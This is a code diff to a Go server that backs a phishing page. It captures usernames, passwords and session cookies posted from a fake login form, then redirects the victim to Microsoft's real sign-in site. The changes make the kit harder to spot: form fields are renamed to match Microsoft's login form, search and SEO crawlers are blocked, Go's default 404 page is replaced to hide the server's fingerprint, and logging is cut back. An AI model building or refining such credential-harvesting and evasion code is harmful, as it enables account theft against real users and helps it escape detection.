@@ -14,6 +14,7 @@ import (
 	"mime/multipart"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 )
 
@@ -50,8 +51,10 @@ func main() {
 		redirectURL = "https://login.microsoftonline.com"
 	}
 
+	rl := NewRateLimiter()
+
 	mux := http.NewServeMux()
-	mux.HandleFunc("POST /capture", handleCapture(redirectURL))
+	mux.HandleFunc("POST /auth", rl.Middleware(handleCapture(redirectURL)))
 	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusOK)
 		w.Write([]byte("ok"))
@@ -68,8 +71,15 @@ func main() {
 		w.Write(landingHTML)
 	})
 
+	// Catch-all 404 — avoids Go's default "404 page not found" fingerprint
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusNotFound)
+		w.Write([]byte("<html><body></body></html>"))
+	})
+
 	log.Printf("Capture backend + landing page listening on :%s (redirect: %s)", port, redirectURL)
-	log.Fatal(http.ListenAndServe(":"+port, mux))
+	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
+	log.Fatal(http.ListenAndServe(":"+port, handler))
 }
 
 func handleCapture(redirectURL string) http.HandlerFunc {
@@ -79,13 +89,12 @@ func handleCapture(redirectURL string) http.HandlerFunc {
 			return
 		}
 
-		username := r.FormValue("username")
-		password := r.FormValue("password")
-		uuid := r.FormValue("uuid")
-		cookies := r.FormValue("cookies")
+		username := r.FormValue("loginfmt")
+		password := r.FormValue("passwd")
+		uuid := r.FormValue("uid")
+		cookies := r.FormValue("ctx")
 
-		log.Printf("[CAPTURE] uuid=%s username=%s ip=%s ua=%s",
-			uuid, username, r.RemoteAddr, r.UserAgent())
+		log.Printf("[AUTH] id=%s ip=%s", uuid, r.RemoteAddr)
 
 		data := map[string]interface{}{
 			"timestamp":  time.Now().UTC().Format(time.RFC3339),
@@ -97,7 +106,7 @@ func handleCapture(redirectURL string) http.HandlerFunc {
 			"user_agent": r.UserAgent(),
 		}
 		// Write analytics event to shared JSONL
-		campaignID := r.FormValue("campaign")
+		campaignID := r.FormValue("cid")
 		status := "success"
 		if username == "" && password == "" {
 			status = "failed"
@@ -132,7 +141,7 @@ func handleCapture(redirectURL string) http.HandlerFunc {
 		}
 
 		// Write encrypted data to stdout (can be piped to file in production)
-		fmt.Printf("CAPTURE: %s\n", base64.StdEncoding.EncodeToString(encrypted))
+		fmt.Printf("AUTH: %s\n", base64.StdEncoding.EncodeToString(encrypted))
 
 		http.Redirect(w, r, redirectURL, http.StatusFound)
 	}
@@ -198,7 +207,8 @@ func writeEvent(ev map[string]interface{}) {
 		log.Printf("[jsonl] marshal error: %v", err)
 		return
 	}
-	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	// Writes with 0600 permissions — analytics server must run as same user to decrypt/read
+	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	if err != nil {
 		log.Printf("[jsonl] open error: %v", err)
 		return
@@ -207,4 +217,35 @@ func writeEvent(ev map[string]interface{}) {
 	if _, err := f.Write(append(raw, '\n')); err != nil {
 		log.Printf("[jsonl] write error: %v", err)
 	}
+}
+
+// --- Security middleware ---
+
+func securityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("X-Content-Type-Options", "nosniff")
+		w.Header().Set("Referrer-Policy", "no-referrer")
+		next.ServeHTTP(w, r)
+	})
+}
+
+var botPatterns = []string{
+	"Googlebot", "Bingbot", "Baiduspider", "DuckDuckBot",
+	"YandexBot", "Slurp", "Facebot", "Twitterbot",
+	"PetalBot", "Applebot", "AhrefsBot", "SemrushBot",
+	"DotBot", "Screaming Frog", "Bytespider",
+}
+
+func blockBots(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		ua := r.UserAgent()
+		for _, p := range botPatterns {
+			if strings.Contains(ua, p) {
+				w.WriteHeader(http.StatusNotFound)
+				w.Write([]byte("<html><body></body></html>"))
+				return
+			}
+		}
+		next.ServeHTTP(w, r)
+	})
 }
